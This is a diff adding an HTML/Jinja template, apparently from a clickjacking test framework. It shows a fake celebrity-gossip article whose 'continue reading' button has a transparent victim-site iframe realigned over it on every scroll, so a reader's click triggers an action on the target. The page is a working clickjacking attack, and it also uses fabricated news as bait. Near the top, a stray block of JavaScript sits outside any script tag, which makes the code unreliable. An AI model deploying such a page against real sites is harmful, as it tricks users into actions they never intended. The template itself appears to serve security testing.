@@ -1,0 +1,94 @@
+{% extends "attacker/base.html" %}
+
+// 布局稳定前按钮位置可能变化（字体渲染/内容加载/滚动条出现），
+// 在所有布局变化点重复对齐，幂等且开销极低。
+window.addEventListener("load", alignFrame);
+window.addEventListener("scroll", alignFrame, { passive: true });
+if (document.fonts && document.fonts.ready) {
+  document.fonts.ready.then(function () { alignFrame(); });
+}
+[300, 800, 1500].forEach(function (ms) { setTimeout(alignFrame, ms); });
+{% block title %}{{ scenario.seq }} {{ scenario.title }}{% endblock %}
+{% block content %}
+{% include "attacker/run/_run_header.html" %}
+
+<article class="scroll-article" id="article">
+  <h2>某明星深夜发文承认恋情，细节令人意外</h2>
+  <p class="article-meta">娱乐速递 · 10 万+ 阅读</p>
+  <p>据可靠消息，昨日深夜某知名艺人在个人账号发布长文，首次回应持续数月的传闻。文中多处细节与此前狗仔拍到的时间线吻合，粉丝群一片哗然……</p>
+  <p>知情人士透露，两人其实早已秘密交往两年，此前为了各自的新剧宣传一直未公开。而这次选择深夜发文，据说与品牌代言合约到期有关……</p>
+  <p>更有意思的是，评论区已经出现了双方工作室的点赞记录，疑似默认。截至发稿，相关话题已冲上热搜前三……</p>
+  <p>关于后续发展，本号将持续追踪。下面这段视频是粉丝在机场拍到的同框画面，两人口罩帽子全副武装，但手上的情侣手链清晰可见……</p>
+  <p>网友整理的时间线显示，两人的航班记录在过去半年重合了十一次，其中三次是同一个航班……</p>
+  <div class="read-more-zone" id="read-more-zone">
+    <p>—— 阅读到此 35% ——</p>
+    <p>剩余 65% 的内容包含：工作室回应原文、机场视频截图、双方过往互动盘点。</p>
+    <button type="button" class="decoy-button" id="decoy-button">{{ params.decoy_text }}</button>
+    <p class="scroll-hint">（继续阅读需观看 5 秒广告后免费解锁）</p>
+  </div>
+</article>
+
+{% set effective_opacity = 0.35 if (params.debug and params.opacity < 0.35) else params.opacity %}
+<!-- The overlay uses position:fixed and realigns on every scroll event, so the
+     victim confirm button tracks the decoy button through the viewport. -->
+<iframe id="victim-frame"
+        class="{{ 'debug-outline' if params.debug else '' }}"
+        title="attack target"
+        src="{{ params.victim_url() }}"
+        style="position: fixed; width: {{ params.iframe_width }}px; height: {{ params.iframe_height }}px; opacity: {{ effective_opacity }}; z-index: 40; border: 0; background: transparent;"></iframe>
+
+<script>
+  const RUN_ID = {{ run.run_id | tojson }};
+  const REPORT_TOKEN = {{ report_token | tojson }};
+  const PARAMS = {{ params.as_dict() | tojson }};
+</script>
+<script src="{{ url_for('static', filename='js/attack-report.js') }}"></script>
+<script>
+  (function () {
+    "use strict";
+    const frame = document.getElementById("victim-frame");
+    const decoy = document.getElementById("decoy-button");
+    const statusLine = document.getElementById("run-status");
+    let loadsForCurrentSrc = 0;
+    let finished = false;
+    let aligned = false;
+
+    function alignFrame() {
+      const decoyRect = decoy.getBoundingClientRect();
+      const visible = decoyRect.top < window.innerHeight && decoyRect.bottom > 0;
+      frame.style.display = visible ? "block" : "none";
+      if (!visible) { return; }
+      // position:fixed is viewport-relative; align the frame center to the
+      // decoy center in viewport coordinates so it tracks through scrolling.
+      frame.style.left = Math.round(decoyRect.left + decoyRect.width / 2 - PARAMS.iframe_width / 2) + "px";
+      frame.style.top = Math.round(decoyRect.top + decoyRect.height / 2 - PARAMS.iframe_height / 2) + "px";
+      if (!aligned) {
+        aligned = true;
+        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "aligned_after_scroll" });
+        statusLine.textContent = "滚动到位：透明 iframe 已与“继续阅读”按钮对齐，等待点击。";
+      }
+    }
+
+    frame.addEventListener("load", function () {
+      loadsForCurrentSrc += 1;
+      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
+        type: "iframe_load", sequence: loadsForCurrentSrc
+      });
+      if (loadsForCurrentSrc >= 2 && !finished) {
+        finished = true;
+        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "victim_action_reload", sequence: loadsForCurrentSrc });
+        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "run_complete", outcome: "likely_success" });
+        statusLine.textContent = "滚动后的诱导点击已触发目标提交，请用 victim 测试 API 核实业务状态变化。";
+      }
+    });
+
+    window.addEventListener("scroll", alignFrame, { passive: true });
+    window.addEventListener("DOMContentLoaded", function () {
+      alignFrame();
+      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "page_ready" });
+      statusLine.textContent = "长页面已就绪：向下滚动到“继续阅读”按钮处完成诱导。";
+    });
+    window.addEventListener("resize", alignFrame);
+  })();
+</script>
+{% endblock %}
